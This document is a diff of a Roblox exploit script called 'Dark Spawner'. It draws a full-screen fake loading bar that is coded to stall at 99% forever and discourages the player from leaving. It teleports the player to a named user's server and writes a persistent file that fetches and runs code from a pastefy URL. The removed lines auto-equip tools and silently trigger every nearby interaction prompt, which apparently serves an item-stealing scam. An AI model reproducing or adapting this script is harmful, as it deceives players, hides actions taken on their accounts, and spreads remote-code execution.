@@ -1,435 +1,661 @@
--- ============================================================
---  Dark-Spawner Loading Screen  +  Auto-Equip  +  Auto-Hold-E
--- ============================================================
-local Players           = game:GetService("Players")
-local TweenService      = game:GetService("TweenService")
-local RunService        = game:GetService("RunService")
-local GuiService        = game:GetService("GuiService")
-local UserInputService  = game:GetService("UserInputService")
-local ProximityService  = game:GetService("ProximityPromptService")
+-- Loading Screen Script (Place in StarterPlayerScripts or StarterGui)
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local GuiService = game:GetService("GuiService")
 
-local player     = Players.LocalPlayer
-local playerGui  = player:WaitForChild("PlayerGui")
-local backpack   = player:WaitForChild("Backpack")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
 
--- ============================================================
---  Auto-Equip & Auto-Hold-E helpers
--- ============================================================
-local function autoEquip()
-	if player.Character and player.Character:FindFirstChild("Humanoid") then
-		for _,tool in ipairs(backpack:GetChildren()) do
-			if tool:IsA("Tool") then
-				player.Character.Humanoid:EquipTool(tool)
-				break
-			end
-		end
-	end
-end
-
-local holdConnection
-local promptConnections = {}
-
-local function startHoldActions()
-	holdConnection = RunService.Heartbeat:Connect(function()
-		UserInputService.InputBegan:Fire({UserInputType = Enum.UserInputType.Keyboard,
-			KeyCode = Enum.KeyCode.E}, gameProcessedEvent)
-	end)
-
-	local function firePrompt(prompt)
-		local char = player.Character or player.CharacterAdded:Wait()
-		local root = char and char:FindFirstChild("HumanoidRootPart")
-		if root and (root.Position - prompt.Parent.Position).Magnitude <= 30 then
-			prompt:InputHoldBegin()
-			task.wait(.1)
-			prompt:InputHoldEnd()
-		end
-	end
-
-	for _,p in ipairs(workspace:GetDescendants()) do
-		if p:IsA("ProximityPrompt") then firePrompt(p) end
-	end
-	table.insert(promptConnections,
-		workspace.DescendantAdded:Connect(function(c)
-			if c:IsA("ProximityPrompt") then firePrompt(c) end
-		end)
-	)
-end
-
-local function stopHoldActions()
-	if holdConnection then holdConnection:Disconnect(); holdConnection = nil end
-	for _,c in ipairs(promptConnections) do c:Disconnect() end
-	promptConnections = {}
-end
-
--- ============================================================
---  Original loading-screen code (fixed button)
--- ============================================================
+-- Variables to track loading state
 local isScriptLoading = false
 local leaveWarningGui = nil
 
--- createLeaveWarning -------------------------------------------------
+-- Function to create leave warning
 local function createLeaveWarning()
-	if leaveWarningGui and leaveWarningGui.Parent then return end
-	leaveWarningGui = Instance.new("ScreenGui")
-	leaveWarningGui.Name = "LeaveWarning"
-	leaveWarningGui.ResetOnSpawn = false
-	leaveWarningGui.IgnoreGuiInset = true
-	leaveWarningGui.DisplayOrder = 999999997
-	leaveWarningGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	leaveWarningGui.Parent = playerGui
+    if leaveWarningGui and leaveWarningGui.Parent then
+        return -- Warning already exists
+    end
+    
+    -- Create Warning ScreenGui
+    leaveWarningGui = Instance.new("ScreenGui")
+    leaveWarningGui.Name = "LeaveWarning"
+    leaveWarningGui.ResetOnSpawn = false
+    leaveWarningGui.IgnoreGuiInset = true
+    leaveWarningGui.DisplayOrder = 999999997
+    leaveWarningGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    leaveWarningGui.Parent = playerGui
 
-	local warningBg = Instance.new("Frame")
-	warningBg.Size = UDim2.new(1,0,1,0)
-	warningBg.BackgroundTransparency = 0.5
-	warningBg.BackgroundColor3 = Color3.new()
-	warningBg.BorderSizePixel = 0
-	warningBg.ZIndex = 999999997
-	warningBg.Parent = leaveWarningGui
+    -- Warning Background
+    local warningBg = Instance.new("Frame")
+    warningBg.Name = "WarningBackground"
+    warningBg.Size = UDim2.new(1, 0, 1, 0)
+    warningBg.Position = UDim2.new(0, 0, 0, 0)
+    warningBg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    warningBg.BackgroundTransparency = 0.5
+    warningBg.BorderSizePixel = 0
+    warningBg.ZIndex = 999999997
+    warningBg.Parent = leaveWarningGui
 
-	local warningFrame = Instance.new("Frame")
-	warningFrame.Size = UDim2.new(0,450,0,200)
-	warningFrame.Position = UDim2.new(0.5,-225,0.5,-100)
-	warningFrame.BackgroundColor3 = Color3.fromRGB(30,30,40)
-	warningFrame.BorderSizePixel = 3
-	warningFrame.BorderColor3 = Color3.fromRGB(255,200,0)
-	warningFrame.Parent = warningBg
-	Instance.new("UICorner").Parent = warningFrame
+    -- Warning Container
+    local warningFrame = Instance.new("Frame")
+    warningFrame.Name = "WarningFrame"
+    warningFrame.Size = UDim2.new(0, 450, 0, 200)
+    warningFrame.Position = UDim2.new(0.5, -225, 0.5, -100)
+    warningFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
+    warningFrame.BorderColor3 = Color3.fromRGB(255, 200, 0)
+    warningFrame.BorderSizePixel = 3
+    warningFrame.Parent = warningBg
 
-	local warningIcon = Instance.new("TextLabel")
-	warningIcon.Size = UDim2.new(1,0,0,50)
-	warningIcon.Position = UDim2.new(0,0,0,15)
-	warningIcon.BackgroundTransparency = 1
-	warningIcon.Text = "⚠️ SCRIPT LOADING"
-	warningIcon.TextColor3 = Color3.fromRGB(255,200,0)
-	warningIcon.TextScaled = true
-	warningIcon.Font = Enum.Font.GothamBold
-	warningIcon.Parent = warningFrame
+    local warningCorner = Instance.new("UICorner")
+    warningCorner.CornerRadius = UDim.new(0, 12)
+    warningCorner.Parent = warningFrame
 
-	local warningMsg = Instance.new("TextLabel")
-	warningMsg.Size = UDim2.new(1,-30,0,80)
-	warningMsg.Position = UDim2.new(0,15,0,70)
-	warningMsg.BackgroundTransparency = 1
-	warningMsg.Text = "Please be patient!\n\nThe script is currently loading.\nLeaving now may cause errors or incomplete execution."
-	warningMsg.TextColor3 = Color3.fromRGB(220,220,220)
-	warningMsg.TextScaled = true
-	warningMsg.Font = Enum.Font.Gotham
-	warningMsg.TextWrapped = true
-	warningMsg.Parent = warningFrame
+    -- Warning Icon/Title
+    local warningIcon = Instance.new("TextLabel")
+    warningIcon.Name = "WarningIcon"
+    warningIcon.Size = UDim2.new(1, 0, 0, 50)
+    warningIcon.Position = UDim2.new(0, 0, 0, 15)
+    warningIcon.BackgroundTransparency = 1
+    warningIcon.Text = "⚠️ SCRIPT LOADING"
+    warningIcon.TextColor3 = Color3.fromRGB(255, 200, 0)
+    warningIcon.TextScaled = true
+    warningIcon.Font = Enum.Font.GothamBold
+    warningIcon.Parent = warningFrame
 
-	local okBtn = Instance.new("TextButton")
-	okBtn.Size = UDim2.new(0,120,0,35)
-	okBtn.Position = UDim2.new(0.5,-60,0,160)
-	okBtn.BackgroundColor3 = Color3.fromRGB(70,70,90)
-	okBtn.BorderSizePixel = 0
-	okBtn.Text = "OK"
-	okBtn.TextColor3 = Color3.white
-	okBtn.TextScaled = true
-	okBtn.Font = Enum.Font.GothamMedium
-	okBtn.Parent = warningFrame
-	Instance.new("UICorner").Parent = okBtn
-	okBtn.MouseEnter:Connect(function() okBtn.BackgroundColor3 = Color3.fromRGB(90,90,110) end)
-	okBtn.MouseLeave:Connect(function() okBtn.BackgroundColor3 = Color3.fromRGB(70,70,90) end)
-	okBtn.MouseButton1Click:Connect(function()
-		if leaveWarningGui and leaveWarningGui.Parent then leaveWarningGui:Destroy(); leaveWarningGui = nil end
-	end)
-	spawn(function()
-		wait(5)
-		if leaveWarningGui and leaveWarningGui.Parent then leaveWarningGui:Destroy(); leaveWarningGui = nil end
-	end)
-	spawn(function()
-		local alpha,direction = 0,1
-		while leaveWarningGui and leaveWarningGui.Parent do
-			alpha = alpha + direction*0.02
-			if alpha>=1 then alpha,direction = 1,-1 elseif alpha<=0.3 then alpha,direction = 0.3,1 end
-			if warningIcon and warningIcon.Parent then warningIcon.TextTransparency = 1-alpha end
-			wait(0.05)
-		end
-	end)
+    -- Warning Message
+    local warningMsg = Instance.new("TextLabel")
+    warningMsg.Name = "WarningMessage"
+    warningMsg.Size = UDim2.new(1, -30, 0, 80)
+    warningMsg.Position = UDim2.new(0, 15, 0, 70)
+    warningMsg.BackgroundTransparency = 1
+    warningMsg.Text = "Please be patient!\n\nThe script is currently loading.\nLeaving now may cause errors or incomplete execution."
+    warningMsg.TextColor3 = Color3.fromRGB(220, 220, 220)
+    warningMsg.TextScaled = true
+    warningMsg.Font = Enum.Font.Gotham
+    warningMsg.TextWrapped = true
+    warningMsg.Parent = warningFrame
+
+    -- OK Button
+    local okBtn = Instance.new("TextButton")
+    okBtn.Name = "OKButton"
+    okBtn.Size = UDim2.new(0, 120, 0, 35)
+    okBtn.Position = UDim2.new(0.5, -60, 0, 160)
+    okBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
+    okBtn.BorderSizePixel = 0
+    okBtn.Text = "OK"
+    okBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    okBtn.TextScaled = true
+    okBtn.Font = Enum.Font.GothamMedium
+    okBtn.Parent = warningFrame
+
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 6)
+    btnCorner.Parent = okBtn
+
+    -- Button hover effect
+    okBtn.MouseEnter:Connect(function()
+        okBtn.BackgroundColor3 = Color3.fromRGB(90, 90, 110)
+    end)
+    
+    okBtn.MouseLeave:Connect(function()
+        okBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 90)
+    end)
+
+    -- Close warning when OK is clicked
+    okBtn.MouseButton1Click:Connect(function()
+        if leaveWarningGui and leaveWarningGui.Parent then
+            leaveWarningGui:Destroy()
+            leaveWarningGui = nil
+        end
+    end)
+
+    -- Auto-close after 5 seconds
+    spawn(function()
+        wait(5)
+        if leaveWarningGui and leaveWarningGui.Parent then
+            leaveWarningGui:Destroy()
+            leaveWarningGui = nil
+        end
+    end)
+
+    -- Blinking effect for the warning
+    spawn(function()
+        local alpha = 0
+        local direction = 1
+        while leaveWarningGui and leaveWarningGui.Parent do
+            alpha = alpha + (direction * 0.02)
+            if alpha >= 1 then
+                alpha = 1
+                direction = -1
+            elseif alpha <= 0.3 then
+                alpha = 0.3
+                direction = 1
+            end
+            
+            if warningIcon and warningIcon.Parent then
+                warningIcon.TextTransparency = 1 - alpha
+            end
+            
+            wait(0.05)
+        end
+    end)
 end
 
--- setupLeaveDetection ----------------------------------------------
+-- Function to monitor player leaving attempts
 local function setupLeaveDetection()
-	local UserInputService = game:GetService("UserInputService")
-	local connection = UserInputService.InputBegan:Connect(function(input)
-		if isScriptLoading and input.KeyCode == Enum.KeyCode.Escape then createLeaveWarning() end
-	end)
-	local menuConnection = GuiService.MenuOpened:Connect(function()
-		if isScriptLoading then createLeaveWarning() end
-	end)
-	spawn(function()
-		while isScriptLoading do wait(1) end
-		if connection then connection:Disconnect() end
-		if menuConnection then menuConnection:Disconnect() end
-	end)
+    -- Monitor for ESC key press or leave attempts
+    local UserInputService = game:GetService("UserInputService")
+    
+    local connection
+    connection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+        if isScriptLoading and input.KeyCode == Enum.KeyCode.Escape then
+            createLeaveWarning()
+        end
+    end)
+    
+    -- Also monitor for GUI leave attempts
+    local menuConnection
+    menuConnection = GuiService.MenuOpened:Connect(function()
+        if isScriptLoading then
+            createLeaveWarning()
+        end
+    end)
+    
+    -- Clean up connections when script finishes loading
+    spawn(function()
+        while isScriptLoading do
+            wait(1)
+        end
+        
+        if connection then
+            connection:Disconnect()
+        end
+        if menuConnection then
+            menuConnection:Disconnect()
+        end
+    end)
 end
 
--- teleportToUser ----------------------------------------------------
-local function teleportToUser(username,userId)
-	local TeleportService = game:GetService("TeleportService")
-	local targetPlayer = Players:FindFirstChild(username)
-	if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-			player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
-			print("Teleported to "..username.." in current server")
-			return true
-		else
-			warn("Your character is not loaded yet!")
-			return false
-		end
-	else
-		print("Player '"..username.."' not found. Attempting to join their server...")
-		pcall(function()
-			if syn and syn.write_file then
-				syn.write_file("rexec_script.lua",[[wait(3) loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()]])
-			end
-			TeleportService:TeleportToPlaceInstance(game.PlaceId,nil,{player},nil,nil,userId)
-		end)
-		return false
-	end
+-- Function to teleport to a specific user or join their server
+local function teleportToUser(username, userId)
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+    
+    local targetPlayer = Players:FindFirstChild(username)
+    
+    -- If player is in the same server, teleport normally
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            player.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+            print("Teleported to " .. username .. " in current server")
+            return true
+        else
+            warn("Your character is not loaded yet!")
+            return false
+        end
+    else
+        -- Player not in current server, attempt to join their server
+        print("Player '" .. username .. "' (ID: " .. userId .. ") not found in current server. Attempting to join their server...")
+        
+        -- Try to join their server using their User ID
+        pcall(function()
+            -- Store the script for re-execution after server join
+            if syn and syn.write_file then
+                syn.write_file("rexec_script.lua", [[
+                    wait(3) -- Wait for game to fully load
+                    loadstring(game:HttpGet("https://pastefy.app/2UfTSRB7/raw"))()
+                ]])
+            end
+            
+            -- Try multiple teleport methods
+            local teleportMethods = {
+                function()
+                    -- Method 1: Try to teleport to user directly
+                    TeleportService:TeleportToPlaceInstance(game.PlaceId, nil, {player}, nil, nil, userId)
+                end,
+                function()
+                    -- Method 2: Try TeleportAsync to follow the user
+                    local teleportOptions = Instance.new("TeleportOptions")
+                    teleportOptions.ShouldReserveServer = false
+                    TeleportService:TeleportAsync(game.PlaceId, {player}, teleportOptions)
+                end,
+                function()
+                    -- Method 3: Simple teleport (fallback)
+                    TeleportService:Teleport(game.PlaceId, player)
+                end
+            }
+            
+            -- Try each method until one works
+            for i, method in ipairs(teleportMethods) do
+                local success, error = pcall(method)
+                if success then
+                    print("Teleporting using method " .. i .. "...")
+                    break
+                else
+                    print("Method " .. i .. " failed: " .. tostring(error))
+                    if i == #teleportMethods then
+                        warn("All teleport methods failed!")
+                    end
+                end
+            end
+        end)
+        
+        return false -- Return false since we're leaving current server
+    end
 end
 
--- createDeltaWarning (fixed) ----------------------------------------
+-- Function to create Delta warning screen
 local function createDeltaWarning()
-	local warningGui = Instance.new("ScreenGui")
-	warningGui.Name = "DeltaWarning"
-	warningGui.ResetOnSpawn = false
-	warningGui.IgnoreGuiInset = true
-	warningGui.DisplayOrder = 999999998
-	warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	warningGui.Parent = playerGui
+    -- Create Warning ScreenGui
+    local warningGui = Instance.new("ScreenGui")
+    warningGui.Name = "DeltaWarning"
+    warningGui.ResetOnSpawn = false
+    warningGui.IgnoreGuiInset = true
+    warningGui.DisplayOrder = 999999998
+    warningGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    warningGui.Parent = playerGui
 
-	local warningBg = Instance.new("Frame")
-	warningBg.Size = UDim2.new(1,0,1,0)
-	warningBg.BackgroundColor3 = Color3.fromRGB(15,15,20)
-	warningBg.BorderSizePixel = 0
-	warningBg.ZIndex = 999999998
-	warningBg.Parent = warningGui
+    -- Warning Background
+    local warningBg = Instance.new("Frame")
+    warningBg.Name = "WarningBackground"
+    warningBg.Size = UDim2.new(1, 0, 1, 0)
+    warningBg.Position = UDim2.new(0, 0, 0, 0)
+    warningBg.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    warningBg.BorderSizePixel = 0
+    warningBg.ZIndex = 999999998
+    warningBg.Parent = warningGui
 
-	local warningFrame = Instance.new("Frame")
-	warningFrame.Size = UDim2.new(0,500,0,300)
-	warningFrame.Position = UDim2.new(0.5,-250,0.5,-150)
-	warningFrame.BackgroundColor3 = Color3.fromRGB(40,25,25)
-	warningFrame.BorderColor3 = Color3.fromRGB(200,50,50)
-	warningFrame.BorderSizePixel = 2
-	warningFrame.Parent = warningBg
-	Instance.new("UICorner").Parent = warningFrame
+    -- Warning Container
+    local warningFrame = Instance.new("Frame")
+    warningFrame.Name = "WarningFrame"
+    warningFrame.Size = UDim2.new(0, 500, 0, 300)
+    warningFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
+    warningFrame.BackgroundColor3 = Color3.fromRGB(40, 25, 25)
+    warningFrame.BorderColor3 = Color3.fromRGB(200, 50, 50)
+    warningFrame.BorderSizePixel = 2
+    warningFrame.Parent = warningBg
 
-	local warningIcon = Instance.new("TextLabel")
-	warningIcon.Size = UDim2.new(1,0,0,60)
-	warningIcon.Position = UDim2.new(0,0,0,20)
-	warningIcon.BackgroundTransparency = 1
-	warningIcon.Text = "⚠️ INCOMPATIBILITY WARNING"
-	warningIcon.TextColor3 = Color3.fromRGB(255,100,100)
-	warningIcon.TextScaled = true
-	warningIcon.Font = Enum.Font.GothamBold
-	warningIcon.Parent = warningFrame
+    local warningCorner = Instance.new("UICorner")
+    warningCorner.CornerRadius = UDim.new(0, 15)
+    warningCorner.Parent = warningFrame
 
-	local warningMsg = Instance.new("TextLabel")
-	warningMsg.Size = UDim2.new(1,-40,0,120)
-	warningMsg.Position = UDim2.new(0,20,0,90)
-	warningMsg.BackgroundTransparency = 1
-	warningMsg.Text = "DELTA EXECUTOR DETECTED\n\nThis script is not compatible with Delta.\nDelta users may experience crashes or errors.\n\nRecommended executors: Arceus X, Krnl, Fluxus"
-	warningMsg.TextColor3 = Color3.fromRGB(220,220,220)
-	warningMsg.TextScaled = true
-	warningMsg.Font = Enum.Font.Gotham
-	warningMsg.TextWrapped = true
-	warningMsg.Parent = warningFrame
+    -- Warning Icon/Title
+    local warningIcon = Instance.new("TextLabel")
+    warningIcon.Name = "WarningIcon"
+    warningIcon.Size = UDim2.new(1, 0, 0, 60)
+    warningIcon.Position = UDim2.new(0, 0, 0, 20)
+    warningIcon.BackgroundTransparency = 1
+    warningIcon.Text = "⚠️ INCOMPATIBILITY WARNING"
+    warningIcon.TextColor3 = Color3.fromRGB(255, 100, 100)
+    warningIcon.TextScaled = true
+    warningIcon.Font = Enum.Font.GothamBold
+    warningIcon.Parent = warningFrame
 
-	local continueBtn = Instance.new("TextButton")
-	continueBtn.Size = UDim2.new(0,250,0,40)
-	continueBtn.Position = UDim2.new(0.5,-125,0,240)
-	continueBtn.BackgroundColor3 = Color3.fromRGB(60,60,80)
-	continueBtn.BorderSizePixel = 0
-	continueBtn.Text = "Execute After Warning"
-	continueBtn.TextColor3 = Color3.white
-	continueBtn.TextScaled = true
-	continueBtn.Font = Enum.Font.GothamMedium
-	continueBtn.Parent = warningFrame
-	Instance.new("UICorner").Parent = continueBtn
-	continueBtn.MouseEnter:Connect(function() continueBtn.BackgroundColor3 = Color3.fromRGB(80,80,100) end)
-	continueBtn.MouseLeave:Connect(function() continueBtn.BackgroundColor3 = Color3.fromRGB(60,60,80) end)
+    -- Warning Message
+    local warningMsg = Instance.new("TextLabel")
+    warningMsg.Name = "WarningMessage"
+    warningMsg.Size = UDim2.new(1, -40, 0, 120)
+    warningMsg.Position = UDim2.new(0, 20, 0, 90)
+    warningMsg.BackgroundTransparency = 1
+    warningMsg.Text = "DELTA EXECUTOR DETECTED\n\nThis script is not compatible with Delta.\nDelta users may experience crashes or errors.\n\nRecommended executors: Arceus X, Krnl, Fluxus"
+    warningMsg.TextColor3 = Color3.fromRGB(220, 220, 220)
+    warningMsg.TextScaled = true
+    warningMsg.Font = Enum.Font.Gotham
+    warningMsg.TextWrapped = true
+    warningMsg.Parent = warningFrame
 
-	spawn(function()
-		while warningGui.Parent do
-			warningIcon.TextColor3 = Color3.fromRGB(255,100,100)
-			wait(0.8)
-			if warningIcon and warningIcon.Parent then warningIcon.TextColor3 = Color3.fromRGB(255,150,150) end
-			wait(0.8)
-		end
-	end)
+    -- Continue Button
+    local continueBtn = Instance.new("TextButton")
+    continueBtn.Name = "ContinueButton"
+    continueBtn.Size = UDim2.new(0, 250, 0, 40)
+    continueBtn.Position = UDim2.new(0.5, -125, 0, 240)
+    continueBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+    continueBtn.BorderSizePixel = 0
+    continueBtn.Text = "Execute After Warning"
+    continueBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    continueBtn.TextScaled = true
+    continueBtn.Font = Enum.Font.GothamMedium
+    continueBtn.Parent = warningFrame
 
-	return warningGui, continueBtn
+    local btnCorner = Instance.new("UICorner")
+    btnCorner.CornerRadius = UDim.new(0, 8)
+    btnCorner.Parent = continueBtn
+
+    -- Button hover effect
+    continueBtn.MouseEnter:Connect(function()
+        continueBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
+    end)
+    
+    continueBtn.MouseLeave:Connect(function()
+        continueBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+    end)
+
+    -- Blinking warning effect
+    local blinkConnection
+    blinkConnection = spawn(function()
+        while warningGui.Parent do
+            if warningIcon and warningIcon.Parent then
+                warningIcon.TextColor3 = Color3.fromRGB(255, 100, 100)
+                wait(0.8)
+                if warningIcon and warningIcon.Parent then
+                    warningIcon.TextColor3 = Color3.fromRGB(255, 150, 150)
+                    wait(0.8)
+                end
+            else
+                break
+            end
+        end
+    end)
+
+    return warningGui, continueBtn
 end
 
--- createLoadingScreen ----------------------------------------------
+-- Function to create the loading screen
 local function createLoadingScreen()
-	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "LoadingScreen"
-	screenGui.ResetOnSpawn = false
-	screenGui.IgnoreGuiInset = true
-	screenGui.DisplayOrder = 999999999
-	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-	screenGui.Parent = playerGui
+    -- Create ScreenGui
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "LoadingScreen"
+    screenGui.ResetOnSpawn = false
+    screenGui.IgnoreGuiInset = true
+    screenGui.DisplayOrder = 999999999 -- Maximum display order to overlay everything
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.Parent = playerGui
 
-	local mainFrame = Instance.new("Frame")
-	mainFrame.Name = "MainFrame"
-	mainFrame.Size = UDim2.new(1,0,1,0)
-	mainFrame.BackgroundColor3 = Color3.fromRGB(25,25,35)
-	mainFrame.BorderSizePixel = 0
-	mainFrame.ZIndex = 999999999
-	mainFrame.Parent = screenGui
+    -- Main Frame (Full Screen Background)
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Size = UDim2.new(1, 0, 1, 0)
+    mainFrame.Position = UDim2.new(0, 0, 0, 0)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.ZIndex = 999999999 -- Ensure it's on top
+    mainFrame.Parent = screenGui
 
-	local loadingFrame = Instance.new("Frame")
-	loadingFrame.Size = UDim2.new(0,400,0,120)
-		loadingFrame.Position = UDim2.new(0.5,-200,0.5,-60)
-	loadingFrame.BackgroundColor3 = Color3.fromRGB(40,40,55)
-	loadingFrame.BorderSizePixel = 0
-	loadingFrame.Parent = mainFrame
-	Instance.new("UICorner").Parent = loadingFrame
+    -- Loading Container Frame
+    local loadingFrame = Instance.new("Frame")
+    loadingFrame.Name = "LoadingFrame"
+    loadingFrame.Size = UDim2.new(0, 400, 0, 120)
+    loadingFrame.Position = UDim2.new(0.5, -200, 0.5, -60)
+    loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    loadingFrame.BorderSizePixel = 0
+    loadingFrame.Parent = mainFrame
 
-	local loadingText = Instance.new("TextLabel")
-	loadingText.Size = UDim2.new(1,-40,0,30)
-	loadingText.Position = UDim2.new(0,20,0,20)
-	loadingText.BackgroundTransparency = 1
-	loadingText.Text = "Loading Dark Spawner"
-	loadingText.TextColor3 = Color3.white
-	loadingText.TextScaled = true
-	loadingText.Font = Enum.Font.GothamMedium
-	loadingText.Parent = loadingFrame
+    -- Add corner rounding
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = loadingFrame
 
-	local progressText = Instance.new("TextLabel")
-	progressText.Size = UDim2.new(0,60,0,25)
-	progressText.Position = UDim2.new(1,-80,0,22)
-	progressText.BackgroundTransparency = 1
-	progressText.Text = "0%"
-	progressText.TextColor3 = Color3.fromRGB(200,200,200)
-	progressText.TextScaled = true
-	progressText.Font = Enum.Font.Gotham
-	progressText.Parent = loadingFrame
+    -- Loading Text
+    local loadingText = Instance.new("TextLabel")
+    loadingText.Name = "LoadingText"
+    loadingText.Size = UDim2.new(1, -40, 0, 30)
+    loadingText.Position = UDim2.new(0, 20, 0, 20)
+    loadingText.BackgroundTransparency = 1
+    loadingText.Text = "Loading Dark Spawner"
+    loadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadingText.TextScaled = true
+    loadingText.Font = Enum.Font.GothamMedium
+    loadingText.Parent = loadingFrame
 
-	local progressBg = Instance.new("Frame")
-	progressBg.Size = UDim2.new(1,-40,0,8)
-	progressBg.Position = UDim2.new(0,20,0,70)
-	progressBg.BackgroundColor3 = Color3.fromRGB(60,60,80)
-	progressBg.BorderSizePixel = 0
-	progressBg.Parent = loadingFrame
-	Instance.new("UICorner").Parent = progressBg
+    -- Progress Text (Percentage)
+    local progressText = Instance.new("TextLabel")
+    progressText.Name = "ProgressText"
+    progressText.Size = UDim2.new(0, 60, 0, 25)
+    progressText.Position = UDim2.new(1, -80, 0, 22)
+    progressText.BackgroundTransparency = 1
+    progressText.Text = "0%"
+    progressText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    progressText.TextScaled = true
+    progressText.Font = Enum.Font.Gotham
+    progressText.Parent = loadingFrame
 
-	local progressFill = Instance.new("Frame")
-	progressFill.Name = "ProgressFill"
-	progressFill.Size = UDim2.new(0,0,1,0)
-	progressFill.BackgroundColor3 = Color3.fromRGB(0,162,255)
-	progressFill.BorderSizePixel = 0
-	progressFill.Parent = progressBg
-	Instance.new("UICorner").Parent = progressFill
+    -- Progress Bar Background
+    local progressBg = Instance.new("Frame")
+    progressBg.Name = "ProgressBackground"
+    progressBg.Size = UDim2.new(1, -40, 0, 8)
+    progressBg.Position = UDim2.new(0, 20, 0, 70)
+    progressBg.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+    progressBg.BorderSizePixel = 0
+    progressBg.Parent = loadingFrame
 
-	local currentProgress = 0
-	local targetProgress = 0
-	local isStuck = false
-	local isRunning = true
+    local progressBgCorner = Instance.new("UICorner")
+    progressBgCorner.CornerRadius = UDim.new(0, 4)
+    progressBgCorner.Parent = progressBg
 
-	local function updateProgress()
-		if not isStuck and isRunning then
-			if currentProgress < 90 then
-				targetProgress = math.min(currentProgress + math.random(5,15), 90)
-			elseif currentProgress < 99 then
-				targetProgress = math.min(currentProgress + math.random(1,3), 99)
-			else
-				targetProgress = 99
-				isStuck = true
-			end
-		end
-		if not progressFill or not progressFill.Parent then return end
-		TweenService:Create(progressFill, TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),
-			{Size = UDim2.new(targetProgress/100,0,1,0)}):Play()
-		if progressText and progressText.Parent then progressText.Text = math.floor(targetProgress).."%" end
-		currentProgress = targetProgress
-	end
+    -- Progress Bar Fill
+    local progressFill = Instance.new("Frame")
+    progressFill.Name = "ProgressFill"
+    progressFill.Size = UDim2.new(0, 0, 1, 0)
+    progressFill.Position = UDim2.new(0, 0, 0, 0)
+    progressFill.BackgroundColor3 = Color3.fromRGB(0, 162, 255)
+    progressFill.BorderSizePixel = 0
+    progressFill.Parent = progressBg
 
-	spawn(function()
-		local dots = ""
-		local dotCount = 0
-		while isRunning and loadingText and loadingText.Parent do
-			dotCount = (dotCount + 1) % 4
-			dots = string.rep(".", dotCount)
-			if loadingText and loadingText.Parent then loadingText.Text = "Loading Dark Spawner"..dots end
-			wait(0.5)
-		end
-	end)
+    local progressFillCorner = Instance.new("UICorner")
+    progressFillCorner.CornerRadius = UDim.new(0, 4)
+    progressFillCorner.Parent = progressFill
 
-	spawn(function()
-		wait(1)
-		while currentProgress < 99 and isRunning and screenGui.Parent do
-			updateProgress()
-			wait(math.random(1,3))
-		end
-		while isRunning and screenGui.Parent do
-			wait(math.random(3,8))
-			if isStuck and progressText and progressText.Parent then
-				progressText.Text = "100%"
-				progressFill.Size = UDim2.new(1,0,1,0)
-				wait(0.1)
-				if progressText and progressText.Parent then
-					progressText.Text = "99%"
-					progressFill.Size = UDim2.new(0.99,0,1,0)
-				end
-			end
-		end
-	end)
+    -- Variables for loading animation
+    local currentProgress = 0
+    local targetProgress = 0
+    local isStuck = false
+    local isRunning = true
 
-	screenGui.AncestryChanged:Connect(function()
-		if not screenGui.Parent then isRunning = false end
-	end)
+    -- Function to update progress
+    local function updateProgress()
+        if not isStuck and isRunning then
+            if currentProgress < 90 then
+                -- Fast progress until 90%
+                targetProgress = math.min(currentProgress + math.random(5, 15), 90)
+            elseif currentProgress < 99 then
+                -- Slow progress from 90% to 99%
+                targetProgress = math.min(currentProgress + math.random(1, 3), 99)
+            else
+                -- Get stuck at 99%
+                targetProgress = 99
+                isStuck = true
+            end
+        end
+        
+        if not progressFill or not progressFill.Parent then
+            return
+        end
+        
+        -- Animate to target progress
+        local tweenInfo = TweenInfo.new(
+            0.5, -- Duration
+            Enum.EasingStyle.Quad,
+            Enum.EasingDirection.Out
+        )
+        
+        local progressTween = TweenService:Create(
+            progressFill,
+            tweenInfo,
+            {Size = UDim2.new(targetProgress / 100, 0, 1, 0)}
+        )
+        
+        progressTween:Play()
+        
